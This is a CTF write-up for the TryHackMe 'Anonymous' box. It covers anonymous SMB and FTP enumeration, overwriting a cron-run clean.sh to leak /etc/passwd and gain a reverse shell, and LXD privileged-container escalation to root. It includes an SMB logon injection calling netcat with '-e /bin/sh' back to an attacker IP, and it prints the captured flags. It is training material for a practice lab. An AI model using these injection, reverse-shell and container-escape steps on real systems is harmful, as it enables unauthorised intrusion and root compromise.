# TryHackMe: Anonymous Writeup 

Anonymous is a TryHackMe CTF. Linux based. SMB/FTP enumeration. Permissions exploitation. LXD privesc.

- Victim IP : 
`10.10.161.57`
- Attacker IP: 
`10.11.8.219`

## Nmap scan

### Basic scan

Basic scan reveals 4 ports.

```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me/anonymous$ nmap 10.10.161.57
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-29 19:04 BST
Nmap scan report for 10.10.161.57
Host is up (0.041s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

### Scan all, all ports 

Further enumeration reveals versioning; SMB services .etc
Strange null-bytes in SMB domains .etc

```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me/anonymous$ nmap 10.10.161.57 -A -p-
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-29 19:04 BST
Nmap scan report for 10.10.161.57
Host is up (0.068s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.8.219
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2020-09-29T18:05:47+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-29T18:05:47
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.01 seconds
```

From the above nmap scan, the shares aren't immediately obvious. 

### SMB share enumeration

Can use nmap to enumerate nmap shares.

Found shares:
- IPC$ __(anon read/write access)__
- pics
- print$

Found a user:
- `namelessone`

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-29 19:15 BST
Nmap scan report for 10.10.161.57
Host is up (0.056s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.161.57\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (anonymous server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.161.57\pics: 
|     Type: STYPE_DISKTREE
|     Comment: My SMB Share Directory for Pics
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\namelessone\pics
|     Anonymous access: READ
|     Current user access: READ
|   \\10.10.161.57\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 4.17 seconds
```

## Access SMB

### Pics share

Share: `\\10.10.161.57\pics`

```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me/anonymous$ smbclient \\\\10.10.161.57\\pics
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 12:11:34 2020
  ..                                  D        0  Thu May 14 02:59:10 2020
  corgo2.jpg                          N    42663  Tue May 12 01:43:42 2020
  puppos.jpeg                         N   265188  Tue May 12 01:43:42 2020

                20508240 blocks of size 1024. 13306808 blocks available
smb: \> 
```

Download the two files
- corgo2.jpg
- puppos2.jpeg

```shell
smb> get corgo2.jpg 
getting file \corgo2.jpg of size 42663 as corgo2.jpg (195.6 KiloBytes/sec) (average 195.6 KiloBytes/sec)
smb> get puppos.jpeg 
getting file \puppos.jpeg of size 265188 as puppos.jpeg (857.5 KiloBytes/sec) (average 583.8 KiloBytes/sec)
```

Both files have fairly generic metadata, and stock photos of corgis.
Nothing came out of running `steghide`, `binwalk`, `exiftool`.

`IPC$` allows anonymous read/write to C:\tmp, but is empty.

## Checking FTP

SMB shares didn't bring back much. Perhaps there's something on FTP.

FTP allows anonymous access.

```
kali@kali:~/Desktop/repos/ctf/try-hack-me/anonymous$ ftp 10.10.161.57
Connected to 10.10.161.57.
220 NamelessOne's FTP Server!
Name (10.10.161.57:kali): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 May 13 19:49 .
drwxr-xr-x    3 65534    65534        4096 May 13 19:49 ..
drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts
226 Directory send OK.
ftp> 
```

Found some folder `\scripts`.

```shell
## As expected, scripts folder contains some... scripts.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04 19:26 .
drwxr-xr-x    3 65534    65534        4096 May 13 19:49 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04 19:24 clean.sh
-rw-rw-r--    1 1000     1000         2408 Sep 29 18:37 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
226 Directory send OK.
```

### Clean shell script

Some shell script.

Removes temporary files and appends a record and `$date` call to a removal log. Potential for import hijack later.

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi

```

### Removed files log

Files seems to be run fairly regularly. There are many lines.

### Todo file

Just says that they need to `disable anonymous login`. Perhaps there's other anonymous logins?

## Gaining access

### SMB route

Could use login exploit to run [reverse netcat shell](../notes/smb.md).

```shell
$ smbclient \\\\10.10.161.57\\tmp
## After login, run.. 
smb: \> logon "/=`nohup nc -nv 10.10.14.36 4444 -e /bin/sh`"
```

This fails, get current ROUTE is VUID 0...
```shell
smb: \> logon "/=`nc 10.11.8.219 4444 -e /bin/sh`"
Password: 
Current VUID is 0
```

### FTP route

We know that `clean.sh` runs on an interval. And we have read/write access on SMB and FTP.

Testing upload on FTP
```shell
ftp> put ~/Desktop/test.txt test.txt
local: /home/kali/Desktop/test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
```

Let's edit the clean.sh slightly and see if we can get more info from it without breaking script.

```bash
#!/bin/bash
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        printf "$(whoami) $(date) $(id) $(cat /etc/passwd)| \nRunning cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && printf "$(whoami) $(date) $(id) $(cat /etc/passwd) \n | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

Tried to delete clean.sh via FTP but did not have permissions to. However, had permission to overwrite!

```shell
ftp> put clean-updated.sh clean.sh
local: clean-updated.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
354 bytes sent in 0.00 secs (10.2303 MB/s)
```

I waited for log to update... Updated .sh file at 19;17, log last updated 19;18...
```shell
-rwxr-xrwx    1 1000     1000          354 Sep 29 19:17 clean.sh
-rw-rw-r--    1 1000     1000         4171 Sep 29 19:18 removed_files.log
```

We can execute scripts here. Also note: script is run as namelessone, and namelessone is LXD group (later potential privesc).

```shell
namelessone Tue Sep 29 19:27:01 UTC 2020 uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(>
```
Injected reverse shell into script; got shell on Netcat.

```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me/anonymous$ nc -lvp 4444
listening on [any] 4444 ...
10.10.161.57: inverse host lookup failed: Unknown host
connect to [10.11.8.219] from (UNKNOWN) [10.10.161.57] 36232
/bin/sh: 0: can't access tty; job control turned off
$ whoami
namelessone
```

## Looting user

### /home/namelessone

```shell
$ pwd
/home/namelessone
$ ls -lah
total 60K
drwxr-xr-x 6 namelessone namelessone 4.0K May 14 01:59 .
drwxr-xr-x 3 root        root        4.0K May 11 14:54 ..
lrwxrwxrwx 1 root        root           9 May 11 15:17 .bash_history -> /dev/null
-rw-r--r-- 1 namelessone namelessone  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 namelessone namelessone 3.7K Apr  4  2018 .bashrc
drwx------ 2 namelessone namelessone 4.0K May 11 14:55 .cache
drwx------ 3 namelessone namelessone 4.0K May 11 14:55 .gnupg
-rw------- 1 namelessone namelessone   36 May 12 20:06 .lesshst
drwxrwxr-x 3 namelessone namelessone 4.0K May 12 19:26 .local
drwxr-xr-x 2 namelessone namelessone 4.0K May 17 11:11 pics
-rw-r--r-- 1 namelessone namelessone  807 Apr  4  2018 .profile
-rw-rw-r-- 1 namelessone namelessone   66 May 12 19:26 .selected_editor
-rw-r--r-- 1 namelessone namelessone    0 May 12 20:18 .sudo_as_admin_successful
-rw-r--r-- 1 namelessone namelessone   33 May 11 18:13 user.txt
-rw------- 1 namelessone namelessone 7.9K May 12 19:52 .viminfo
-rw-rw-r-- 1 namelessone namelessone  215 May 13 20:20 .wget-hsts
```

### User flag

```
$ cat user.txt 
90d6f992585815ff991e68748c414740
```

### /etc/passwd
```shell
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
namelessone:x:1000:1000:namelessone:/home/namelessone:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
ftp:x:111:113:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

## Root privesc

First upgrade shell.

```
python -c 'import pty; pty.spawn("/bin/sh")'
$ bash
bash
namelessone@anonymous:~$ 
```

Can't check `sudo -l` as not password...

Though, we did see namelessone is in `lxd` group. Can try get a privileged shell in a linux container..

### LXD privesc
#### Download an alpine image
See notes in [LXD privesc file](../notes/lxd-lxc.md) for images, full walkthrough etc.
#### Create storage device 
```shell
## On VICTIM
## Create a storage device.. select all default values
lxd init;
```
#### Start python server
```shell
## On ATTACKER
## Start a Python server to upload an alpine LXC image:
mkdir python-server
cd /python-server/
python3 -m http.server
```
Move alpine image into server folder
```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me/anonymous/python-server$ ls -lahtotal 3.1M
drwxr-xr-x 2 kali kali 4.0K Sep 29 20:52 .
drwxr-xr-x 4 kali kali 4.0K Sep 29 20:50 ..
-rw-r--r-- 1 kali kali 3.1M Sep 29 20:52 alpine.tar.gz
```
### Downlad alpine image
Once server is upon, wget or curl the image to the victim machine.
```shell
## Remove python servers tends to default to port 8000..
wget http://10.11.8.219/alpine.tar.gz
...
...
...
Download complete (yay.)
```

### Create new image
```shell
namelessone@anonymous:~$ lxc image import alpine.tar.gz --alias alpine
lxc image import alpine.tar.gz --alias alpine
namelessone@anonymous:~$ lxd image list
lxd image list
Error: This must be run as root
namelessone@anonymous:~$ lxc image list
lxc image list
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| alpine | 9aa953736e7a | no     | alpine v3.12 (20200927_21:46) | x86_64 | 3.06MB | Sep 29, 2020 at 7:59pm (UTC) |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
## If you forget the alias then you can run:
## lxc image delete FINGER_PRINT_HERE
```

### Initialise privileged container
```shell
# Launch the image with privileged security flag.
ash@tabby:~/alpine$ lxc init alpine exploitcontainer2 -c security.privileged=true 
<less exploitcontainer2 -c security.privileged=true 
Creating exploitcontainer2
```

### Mount /root directory to container
```shell
# Mount the victim machines `/root` directory to device.
namelessone@anonymous:~$ lxc config device add exploitcontainer2 host-root disk source=/ path=/mnt/root recursive=true
<st-root disk source=/ path=/mnt/root recursive=true
Device host-root added to exploitcontainer2
```

### Start the container
```shell
# Start container
namelessone@anonymous:~$ lxc start exploitcontainer2
lxc start exploitcontainer2
namelessone@anonymous:~$ 
```

### Get root shell
```shell
# Get root shell from container
namelessone@anonymous:~$ lxc exec exploitcontainer2 /bin/sh
lxc exec exploitcontainer2 /bin/sh
~ # ^[[31;5Rls -lah
ls -lah
total 4K     
drwx------    1 root     root          24 Sep 29 20:07 .
drwxr-xr-x    1 root     root         114 Sep 29 20:06 ..
-rw-------    1 root     root           8 Sep 29 20:07 .ash_history
~ # ^[[31;5Rwhoami
whoami
root
```

### Navigate to mounted root
```shell
cd mnt
/mnt # ^[[31;8Rls
ls
root
/mnt # ^[[31;8Rcd root
cd root
/mnt/root # ^[[31;13Rls
ls
bin         etc         lost+found  proc        snap        tmp
boot        home        media       root        srv         usr
cdrom       lib         mnt         run         swap.img    var
dev         lib64       opt         sbin        sys
/mnt/root # ^[[31;13Rcd root
cd root
```

### Root flag
```shell
/mnt/root/root # ^[[31;18Rls
ls
root.txt
/mnt/root/root # ^[[31;18Rls -lah
ls -lah
total 60K    
drwx------    6 root     root        4.0K May 17 21:30 .
drwxr-xr-x   24 root     root        4.0K May 12 17:04 ..
-rw-------    1 root     root          55 May 14 14:53 .Xauthority
lrwxrwxrwx    1 root     root           9 May 11 15:17 .bash_history -> /dev/null
-rw-r--r--    1 root     root        3.0K Apr  9  2018 .bashrc
drwx------    2 root     root        4.0K May 11 16:05 .cache
drwx------    3 root     root        4.0K May 11 16:05 .gnupg
drwxr-xr-x    3 root     root        4.0K May 11 20:10 .local
-rw-r--r--    1 root     root         148 Aug 17  2015 .profile
-rw-r--r--    1 root     root          66 May 11 20:10 .selected_editor
drwx------    2 root     root        4.0K May 11 14:54 .ssh
-rw-------    1 root     root       13.5K May 17 21:30 .viminfo
-rw-r--r--    1 root     root          33 May 11 19:15 root.txt
```

```shell
/mnt/root/root # ^[[31;18Rcat root.txt
cat root.txt
4d930091c31a622a7ed10f27999af363
```

.................................................

